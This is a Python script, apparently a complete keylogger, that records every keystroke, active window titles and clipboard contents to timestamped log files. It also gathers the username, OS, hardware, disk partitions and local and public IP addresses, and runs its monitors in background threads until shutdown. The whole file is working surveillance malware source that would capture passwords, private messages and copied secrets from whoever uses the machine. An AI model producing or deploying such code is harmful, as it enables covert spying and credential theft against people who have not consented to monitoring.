import platform
import socket
import psutil
import requests
import datetime
import keyboard
import pygetwindow as gw
import threading
import time
import signal
import os
import atexit
import getpass
import shutil
import pyperclip

# Create a new folder for the current session
timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
session_folder = f'session_{timestamp}'
os.makedirs(session_folder, exist_ok=True)

# Define the log file paths within the session folder
log_file = os.path.join(session_folder, f'keylog_{timestamp}.txt')
clipboard_file = os.path.join(session_folder, f'clipboard_{timestamp}.txt')

# Initialize variables
previous_window = None
sentence = ""
previous_clipboard_content = None

def log_message(message, log_type='keylog'):
    """Log a custom message to the log file or clipboard file."""
    file_path = clipboard_file if log_type == 'clipboard' else log_file
    with open(file_path, 'a') as f:
        f.write(f"{message}\n")

def log_sentence():
    """Log the current sentence to the file."""
    global sentence
    if sentence:
        log_message(f" - {sentence}")
        sentence = ""

def get_device_info():
    """Gather and return device information."""
    try:
        public_ip = requests.get('https://api.ipify.org').text
    except requests.RequestException:
        public_ip = "Unable to get public IP"

    partitions = [
        {
            'device': p.device,
            'mountpoint': p.mountpoint,
            'filesystem': p.fstype,
            'total': round(shutil.disk_usage(p.mountpoint).total / (1024 ** 3), 2),
            'used': round(shutil.disk_usage(p.mountpoint).used / (1024 ** 3), 2),
            'free': round(shutil.disk_usage(p.mountpoint).free / (1024 ** 3), 2),
        }
        for p in psutil.disk_partitions() if os.access(p.mountpoint, os.R_OK)
    ]

    return {
        'os': f"{platform.system()} {platform.release()}",
        'node': platform.node(),
        'version': platform.version(),
        'machine': platform.machine(),
        'processor': platform.processor(),
        'cpu_count': psutil.cpu_count(logical=True),
        'cpu_freq': psutil.cpu_freq().current if psutil.cpu_freq() else "N/A",
        'ram': round(psutil.virtual_memory().total / (1024 ** 3), 2),
        'storage': partitions,
        'local_ip': socket.gethostbyname(socket.gethostname()),
        'public_ip': public_ip,
    }

def log_device_info():
    """Log device information at the start of the session."""
    device_info = get_device_info()
    user_info = getpass.getuser()
    with open(log_file, 'a') as f:
        f.write("### Device Information ###\n")
        f.write(f"User: {user_info}\n")
        for key, value in device_info.items():
            if key == 'storage':
                f.write("Storage:\n")
                for storage in value:
                    f.write(f"  Device: {storage['device']}\n")
                    f.write(f"  Mountpoint: {storage['mountpoint']}\n")
                    f.write(f"  Filesystem: {storage['filesystem']}\n")
                    f.write(f"  Total: {storage['total']} GB\n")
                    f.write(f"  Used: {storage['used']} GB\n")
                    f.write(f"  Free: {storage['free']} GB\n")
            else:
                f.write(f"{key}: {value}\n")

def monitor_active_window():
    """Continuously monitor the active window and log changes."""
    global previous_window

    while True:
        current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        active_window = gw.getActiveWindow()
        window_title = active_window.title if active_window else 'No active window'

        if window_title != previous_window:
            if previous_window is not None:
                log_sentence()
                log_message("")

            log_message(f"[{current_time}] Active Window: {window_title}")

            previous_window = window_title

        time.sleep(0.1)

def on_key_press(event):
    """Handle key press events."""
    global sentence

    if event.name == 'enter':
        log_sentence()
    elif event.name == 'space':
        sentence += ' '
    elif len(event.name) == 1:
        sentence += event.name
    elif event.name == 'backspace' and sentence:
        sentence = sentence[:-1]
    else:
        sentence += f"[{event.name}]"

def monitor_clipboard():
    """Monitor clipboard for changes."""
    global previous_clipboard_content

    while True:
        try:
            current_clipboard_content = pyperclip.paste()

            if current_clipboard_content != previous_clipboard_content:
                previous_clipboard_content = current_clipboard_content
                timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                log_message(f"[{timestamp}] Clipboard Content: {current_clipboard_content}", log_type='clipboard')
                log_message("[copy clipboard]")
        except Exception as e:
            log_message(f"### Clipboard Error: {str(e)}", log_type='clipboard')

        time.sleep(1)

def finalize_session(signum=None, frame=None):
    """Finalize the keylogger session and log the session end."""
    log_message("### Device Shutdown ###")
    log_sentence()
    end_time = datetime.datetime.now().strftime('%Y-%m-%d')
    log_message(f"\n### Keylogger Log - Session End ###\nDate: {end_time}")
    log_message(f"### Clipboard Log - Session End ###\nDate: {end_time}", log_type='clipboard')

# Log the session start
log_message("### Device Turn On ###")
log_device_info()
log_message(f"### Clipboard Log - Session Start ###\nDate: {datetime.datetime.now().strftime('%Y-%m-%d')}", log_type='clipboard')

# Register the finalize_session function to be called on exit
atexit.register(finalize_session)

# Handle system signals for graceful shutdown
signal.signal(signal.SIGTERM, finalize_session)
signal.signal(signal.SIGINT, finalize_session)

# Set up keyboard event listener
keyboard.on_press(on_key_press)
keyboard.add_hotkey('ctrl+c', lambda: log_message("[copy clipboard]"))
keyboard.add_hotkey('ctrl+v', lambda: log_message("[paste clipboard]"))

# Start monitoring the active window and clipboard in separate threads
threading.Thread(target=monitor_active_window, daemon=True).start()
threading.Thread(target=monitor_clipboard, daemon=True).start()

# Wait for a key press event to initiate
keyboard.wait()
